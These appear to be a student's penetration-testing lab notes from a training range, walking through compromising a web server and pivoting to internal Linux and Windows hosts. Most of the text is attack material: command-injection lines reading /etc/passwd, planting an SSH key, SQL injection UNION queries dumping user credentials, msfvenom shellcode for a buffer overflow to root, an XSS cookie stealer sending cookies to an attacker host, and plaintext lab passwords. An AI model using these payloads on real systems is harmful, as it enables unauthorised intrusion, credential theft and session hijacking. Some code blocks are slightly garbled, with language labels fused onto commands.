# CCTC-Security
# Penetration Testing Lab Notes

**Stack:** 4  
**Network:** `10.208.50.200/24`  
**Target:** `10.50.16.50` (PublicFacingWebsite)  
**Do NOT use jump box today**

---

## Lab Setup & Initial Access

### Jump Box Connection
```bash
ssh demo1@10.50.14.253 -L 1111:10.208.50.61:80
Access class info: http://127.0.0.1:1111/classinfo
Credentials

Username: JADU-019-M
Password: gXliXVXVuULy

Target Information

IP:10.50.16.50 (Public Facing Web Server)
Open Ports: 22, 53, 80


Phase 1: Web Server Enumeration (Port 80)
Nmap Scripts
Bashnmap -Pn -T5 -sT -p 80 --script http-enum.nse 10.50.16.50
nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse 10.50.16.50
nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse 10.50.16.50
Key Findings

/login.html — Vulnerable login page (possible admin area)
SQL Injection in username field
' OR 1='1 works in username and password
Command injection via "Decode String" prompt

Command Injection Examples
Bash; whoami                    # → www-data
; cat /etc/passwd
; ls -la /var/www
Discovery: www-data home directory = /var/www

Phase 2: Initial Access via SSH Key Upload
1. Generate Key (on Linops)
Bashssh-keygen -t rsa -b 4096          # No passphrase
cat ~/.ssh/id_rsa.pub
2. Upload Key (via Command Injection on Target)
Bash; mkdir -p /var/www/.ssh
; echo "ssh-rsa AAAAB3NzaC1yc2E...your_public_key..." > /var/www/.ssh/authorized_keys
; cat /var/www/.ssh/authorized_keys
3. SSH In
Bashssh www-data@10.50.16.50
Post-Login Checks:
Baship addr show                  # 10.10.28.20/27
sudo -l                       # Can run /var/tmp/exploit_me
bash                          # Drop to proper shell

Phase 3: Pivoting & Network Discovery
Dynamic SOCKS Proxy
Bashssh www-data@10.50.16.50 -D 9050 2>/dev/null
proxychains nmap -Pn -T4 192.168.28.175
Local Port Forwarding
Bashssh www-data@10.50.16.50 -L 10601:192.168.28.175:8000
# Browse: http://127.0.0.1:10601
Ping Sweeps (from compromised hosts)
Bash# From www-data
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null; done

# From user3@RoundSensor
for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null; done
Discovered Hosts

192.168.28.165 → Ports 22, 8888
192.168.28.189 → Ports 22, 135, 139, 445, 3389, 9999

Access to RoundSensor
Bashssh www-data@10.50.16.50 -L 10605:192.168.28.165:22
ssh user3@localhost -p 10605          # Password: Bob4THEPin3apples
Access to Windows Workstation
Bashssh user3@localhost -p 10605 -L 10606:192.168.28.189:3389
xfreerdp /u:Aaron /p:appleBottomJ3an$ /v:localhost:10606 /cert-ignore

Phase 4: SQL Injection (GET Method)
Vulnerable Parameter: ?product=
Enumeration Steps
SQL?product=7 OR 1=1
?product=7 UNION SELECT 1,2,@@version
?product=7 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
Golden Statement:
SQLUNION SELECT table_schema,table_name,column_name FROM information_schema.columns
Successful Credential Dump:
SQL?product=7 UNION SELECT user_id,name,username FROM siteusers.users
Credentials (after ROT13 decode):

Aaron → appleBottomJ3an$
user2 → TurkeyDay24
user3 → Bob4THEPin3apples ← Working
Lee_Roth → Lroth / anotherpassword4THEages


Phase 5: Linux Buffer Overflow (Must Run on Target)
Warning: All steps performed on the target system.
Workflow

gdb exploit_me
Generate pattern on wiremask.eu (length 100)
Find EIP offset
Create /tmp/exploit.py
Use env - gdb to clean environment:Bashunset env LINES
unset env COLUMNS
Find jmp esp:Bashfind /b <heap_end>, <stack_start>, 0xff, 0xe4
Generate payload:Bashmsfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00' -f python
Final execution:Bashsudo ./exploit_me $(python exploit.py)

Success: Root shell (#)

SSH Tunneling & Master Socket Cheat Sheet
Create Master Socket
Bashssh -MS /tmp/jump user@ip
Dynamic Proxy (for proxychains)
Bashssh -S /tmp/jump jump -O forward -D 9050
Local Port Forward
Bashssh -S /tmp/jump jump -O forward -L 1111:internal_ip:80
Cancel Forward
Bashssh -S /tmp/jump jump -O cancel -L 1111:internal_ip:80
Check active connections:
Bashss -antlp

Web Exploitation Techniques

Command Injection:; whoami | ; cat /etc/passwd
Directory Traversal:../../../../../../etc/passwd
XSS Cookie Stealer:HTML<script>document.location="http://YOUR_IP:PORT/?c="+document.cookie;</script>
SSH Key Upload (see Phase 2)


SQL Injection Quick Reference

Find vulnerable field: ' OR 1='1
Determine columns: UNION SELECT 1,2,3,4
Golden Statement:SQLUNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns
Dump data:SQLUNION SELECT 1,2,username,password FROM users


Linux Privilege Escalation
Bashwhoami && id && sudo -l
cat /etc/passwd && cat /etc/hosts
uname -a && cat /etc/*release*
find / -perm -4000 -ls 2>/dev/null     # SUID
find / -perm -6000 -ls 2>/dev/null     # SUID + SGID
Tools: GTFOBins

Post-Exploitation Enumeration
Linux
Baship addr
ss -antp
ps -ef
ls -la /var/log /tmp /home /etc/cron*
Windows
cmdsysteminfo
net user
tasklist /svc
ipconfig /all

Target Tasking Summary

PublicFacingWebsite — Initial web access + pivot
BestWebApp — Additional web exploitation
RoundSensor — Linux privilege escalation
Windows-Workstation — RDP + Windows exploitation


Tips:

Always run ls -la
Use Master Sockets for clean pivoting
Never close terminals with active SSH sockets
Document every new IP and credential immediatel



































































